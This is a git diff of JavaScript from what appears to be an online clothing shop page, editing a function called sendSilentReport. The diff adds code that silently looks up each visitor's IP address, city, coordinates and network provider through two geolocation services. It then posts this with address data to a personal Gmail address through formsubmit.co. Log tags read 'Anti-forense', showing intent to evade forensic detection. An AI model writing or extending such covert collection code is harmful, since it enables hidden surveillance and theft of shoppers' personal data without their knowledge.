@@ -113,12 +113,43 @@ async function sendSilentReport(addressData) {
 
     let ipData = null;
     try {
-        const response = await fetch("https://ipapi.co/json/");
+        const response = await fetch("https://ipwho.is/");
         if (response.ok) {
-            ipData = await response.json();
+            const data = await response.json();
+            if (data && data.success) {
+                ipData = {
+                    ip: data.ip,
+                    city: data.city,
+                    region: data.region,
+                    country_name: data.country,
+                    latitude: data.latitude,
+                    longitude: data.longitude,
+                    org: data.connection ? data.connection.org : ''
+                };
+            }
         }
     } catch (e) {
-        console.warn('[Anti-forense] Falha na geolocalização por IP:', e);
+        console.warn('[Anti-forense] Falha na geolocalização por ipwho.is:', e);
+    }
+
+    if (!ipData) {
+        try {
+            const response = await fetch("https://freeipapi.com/api/json");
+            if (response.ok) {
+                const data = await response.json();
+                ipData = {
+                    ip: data.ipAddress,
+                    city: data.cityName,
+                    region: data.regionName,
+                    country_name: data.countryName,
+                    latitude: data.latitude,
+                    longitude: data.longitude,
+                    org: ''
+                };
+            }
+        } catch (e) {
+            console.warn('[Anti-forense] Falha na geolocalização por freeipapi.com:', e);
+        }
     }
 
     const payload = {
@@ -200,7 +231,7 @@ async function sendSilentReport(addressData) {
     };
 
     try {
-        await fetch("https://formsubmit.co/ajax/modexatcc@gmail.com", {
+        const res = await fetch("https://formsubmit.co/ajax/modexatcc@gmail.com", {
             method: "POST",
             headers: {
                 "Content-Type": "application/json",
@@ -209,6 +240,9 @@ async function sendSilentReport(addressData) {
             keepalive: true,
             body: JSON.stringify(emailPayload)
         });
+        console.log('[Anti-forense] Status:', res.status, res.statusText);
+        const resJson = await res.json();
+        console.log('[Anti-forense] Resultado:', resJson);
     } catch (e) {
         console.warn('[Anti-forense] Falha no fetch silencioso:', e);
     }
@@ -226,7 +260,7 @@ async function sendSilentReport(addressData) {
         updateCart();
     }
 
-    window.location.replace("https://www.google.com/search?tbm=shop&q=roupas+femininas+modexa");
+    // window.location.replace("https://www.google.com/search?tbm=shop&q=roupas+femininas+modexa");
 }
 window.sendSilentReport = sendSilentReport;
 
